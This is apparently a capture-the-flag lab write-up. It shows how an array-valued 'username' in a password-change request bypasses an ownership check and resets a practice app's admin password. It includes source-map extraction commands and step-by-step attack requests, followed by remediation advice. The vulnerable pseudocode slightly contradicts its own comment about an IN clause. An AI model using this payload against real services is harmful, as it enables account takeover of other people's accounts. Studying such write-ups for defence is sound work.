---
title: Tanuki - Access Control
tags:
  - bugforge
  - broken-access-control
  - type-confusion
  - mass-assignment
  - source-maps
  - caido
aliases:
  - "/BugForge/Tanuki---Access-Control"
---
- The interesting part is that the obvious attack (just ask to change someone else's password) is blocked server-side, and the win comes from a JavaScript-vs-SQL type-confusion bug that a single response field quietly reveals

## Enumeration

- Register an account and click around. JWT lands in `localStorage`, the app calls a JSON API under `/api/`
- React production builds ship a source map. Pull it and read the real source - this is the fastest way to map every endpoint and see how auth is enforced

1. Grab the bundle and its map

```bash
# the HTML references /static/js/main.<hash>.js which declares its .map
curl -s https://<lab-host>/static/js/main.ee88be32.js.map -o main.js.map

# extract the original sources out of sourcesContent
python3 - <<'PY'
import json, os, re
m = json.load(open('main.js.map'))
for src, content in zip(m['sources'], m['sourcesContent']):
    if not content or 'node_modules' in src: continue
    path = os.path.join('src', re.sub(r'^webpack://[^/]*/', '', src).lstrip('./'))
    os.makedirs(os.path.dirname(path), exist_ok=True)
    open(path, 'w').write(content)
print("done")
PY
```

2. Endpoints (from the extracted components + the axios calls)

```
POST /api/register                 - open registration, returns JWT
POST /api/login                    - returns JWT
GET  /api/verify-token             - whoami
POST /api/profile/change-password  - body {username, newPassword}   <-- note: no current password
GET  /api/community                - public decks (leaks contributor usernames)
GET  /api/admin/users              - admin only
POST /api/forgot-password          - body {email}
POST /api/reset-password           - body {token, password}
```

3. Users

```
id:1 - admin (role: admin)   <-- target
id:N - <your registered user>
```

- The standout is `POST /api/profile/change-password`. Here is what the frontend (`Settings.js`) actually sends:

```javascript
// Settings.js
const response = await axios.post('/api/profile/change-password', {
  username: user.username,   // identity comes from the CLIENT, not the server's token
  newPassword,
});
```

- Two things jump out: the **target username is taken from the request body**, and there is **no current-password field**. If the server trusts that body value, you could set anyone's password. That is the thread to pull.

## Mapping the server's checks

- First, set a baseline: register a user and get a token

```http
POST /api/register HTTP/1.1
Host: <lab-host>
Content-Type: application/json

{"username":"pwn_zk1","email":"pwn_zk1@test.local","password":"Pwn3dPass!23","full_name":"zk one"}
```

- Response: `200` with a JWT for `id:4, username: pwn_zk1`. The token has no `role` claim - role is decided server-side.

- Try the obvious thing - change the admin's password using my token:

```http
POST /api/profile/change-password HTTP/1.1
Host: <lab-host>
Authorization: Bearer <my-jwt>
Content-Type: application/json

{"username":"admin","newPassword":"Pwn3dAdmin!23"}
```

- Response: `403 {"error":"You can only change your own password"}`

- So there IS a server-side ownership check. 
- Good to know it is not a free IDOR. Now find out exactly what it compares. Change my OWN password to see a success response:

```http
POST /api/profile/change-password
Authorization: Bearer <my-jwt>

{"username":"pwn_zk1","newPassword":"NewOwnPass!23"}
```

- Response: `200 {"message":"Password updated","accounts_updated":1}`

- That `accounts_updated` field is the whole game. 
- It is the SQL `UPDATE` rowcount. The query is clearly something like `UPDATE users SET password = ? WHERE username = ?`, and the server is kind enough to tell us how many rows it touched. 
- If we can ever make a single request return `accounts_updated: 2`, we have hit a second row - the admin's.

- Confirm the ownership check is comparing against the **token**, not doing a DB lookup, by targeting a user that does not exist:

```http
POST /api/profile/change-password
Authorization: Bearer <my-jwt>

{"username":"nonexistent_user_zzz","newPassword":"Whatever!23"}
```

- Response: `403 "You can only change your own password"` (not "user not found"). So the logic is effectively `if (body.username !== token.username) reject`.

- And confirm `admin` really exists with a wrong-password login (error differential):

```http
POST /api/login
{"username":"admin","password":"wrongpass123"}
```

- Response: `400 "Invalid credentials"` (not "user not found") = the account exists.

## Walking the collisions (eliminating the easy answers)

- The ownership check wants `body.username` to equal my token's username, but the `UPDATE ... WHERE username = ...` is a separate layer. 
- The bug will be a case where those two layers disagree about what equals what. 
- Registration lets me create many users, so I can craft a token whose username is "almost admin".

- Every test below uses the `accounts_updated` oracle. Baseline is `1` (my own row). Anything that returns `2` means I also hit admin.

| Attempt | Registered as (token user) | Body `username` | Result | Conclusion |
|--------|-----------------------------|------------------|--------|------------|
| Case variant | `ADMIN` (id 5) | `ADMIN` | `accounts_updated: 1` | column is case-sensitive, `ADMIN` != `admin` |
| Case variant | `Admin` (id 6) | `Admin` | `accounts_updated: 1` | same |
| Trailing space | `admin ` (id 7) | `admin ` | `accounts_updated: 1` | DB comparison is space-sensitive |
| SQL injection | `zk' OR username='admin` (id 8) | (same) | `accounts_updated: 1` | query is parameterized, no SQLi |

- Useful detail: registration happily accepted `ADMIN`, `Admin`, and `admin ` as **distinct** accounts. 
- So the username column treats those as different values (case- and space-sensitive uniqueness), and the `UPDATE` matches them exactly. ASCII case tricks, whitespace tricks, and SQL injection are all dead ends here.

- That leaves the disagreement between **JavaScript comparison** and the **SQL layer** when the value is not a plain string.

## The Vulnerability - array type confusion

- What happens if `username` is an array instead of a string?
- A common vulnerable pattern: the ownership check is written as `username.includes(req.user.username)` (works on both strings and arrays), while the query builder spreads an array into an `IN (...)` clause.
  - `["pwn_zk1","admin"].includes("pwn_zk1")` -> `true` -> ownership passes
  - `UPDATE users SET password = ? WHERE username IN ('pwn_zk1','admin')` -> updates **two** rows

```javascript
// Pseudocode of the vulnerable pattern
app.post('/api/profile/change-password', auth, (req, res) => {
  const { username, newPassword } = req.body;
  // ownership "check" - true as long as MY name is somewhere in the value
  if (!username.includes(req.user.username)) {
    return res.status(403).json({ error: "You can only change your own password" });
  }
  // query builder turns an array into  WHERE username IN (...)
  const result = db.run(
    `UPDATE users SET password = ? WHERE username = ?`, [hash(newPassword), username]
  );
  res.json({ message: "Password updated", accounts_updated: result.changes });
});
```

- Send the array, with my own username included so the ownership check passes, and `admin` riding along:

```http
POST /api/profile/change-password HTTP/1.1
Host: <lab-host>
Authorization: Bearer <my-jwt for pwn_zk1>
Content-Type: application/json

{"username":["pwn_zk1","admin"],"newPassword":"ArrayPwn!23"}
```

- Response:

```json
{"message":"Password updated","accounts_updated":2}
```

- `accounts_updated: 2`. Two rows changed in one request - mine and the admin's.

## Exploitation

- Log in as `admin` with the password we just set:

```http
POST /api/login HTTP/1.1
Host: <lab-host>
Content-Type: application/json

{"username":"admin","password":"ArrayPwn!23"}
```

- Response:

```json
{
  "token": "eyJ...",
  "user": {
    "id": 1,
    "username": "admin",
    "email": "bug{...}",
    "full_name": "Tanuki Admin",
    "role": "admin"
  }
}
```

- Full admin login. The flag is returned in the admin profile.

## Flag

```
bug{...}
```

## Security Takeaways

### Vulnerability

- Broken Access Control via type confusion on `POST /api/profile/change-password`
- OWASP Top 10: A01:2021 - Broken Access Control (with an A03 Injection flavour in how the array reaches the query)
- CWE: CWE-639 (Authorization Bypass Through User-Controlled Key) + CWE-843 (Type Confusion)

### Impact

- Any registered user can overwrite the password of any account, including `admin`
- Result is full account takeover and privilege escalation to the admin role

### Root Cause

- Identity for the WRITE was taken from the request body, not from the authenticated token
- The ownership check used a membership-style comparison (`username.includes(token.username)`) that returns true for an array as long as the caller's own name is present
- The query builder accepted the same array and expanded it into a multi-value `WHERE username IN (...)`, so one authorized identity smuggled in a second, unauthorized one
- The two layers disagreed on the type and meaning of `username`

### Remediation

- Derive the target identity from the server-side session/token, never from a client-supplied field
- Require and verify the current password before any password change
- Validate and coerce input types - reject non-string `username`, or treat the whole body field as a single opaque string in the query
- Scope the `UPDATE` to the authenticated user's primary key (`WHERE id = ?` with the token's id), not to a name in the body

### Key Lessons

- Read the source map first. The body shape `{username, newPassword}` with no current password told us where to dig before sending a single attack request
- Watch what the API volunteers. A rowcount like `accounts_updated` is a perfect blind oracle - it confirmed the bypass before we ever logged in
- When a string IDOR is blocked, change the TYPE. Arrays, duplicate keys, and nested objects expose the seam between a language's `===`/`includes()` and the database's `IN (...)`
- Burn the cheap collisions first (case, whitespace, injection). Proving they all return rowcount `1` is what tells you the remaining bug is type confusion, not collation or SQLi
